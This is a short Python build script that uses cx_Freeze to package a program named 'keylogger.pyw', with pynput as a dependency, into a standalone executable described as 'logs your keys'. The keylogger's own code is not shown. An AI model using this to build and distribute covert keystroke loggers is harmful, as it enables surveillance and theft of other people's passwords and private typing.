from cx_Freeze import setup, Executable

base = None    

executables = [Executable("keylogger.pyw", base=base)]

packages = ["idna","pynput"]
options = {
    'build_exe': {    
        'packages':packages,
    },    
}

setup(
    name = "Key Logger",
    options = options,
    version = "1",
    description = 'logs your keys',
    executables = executables
)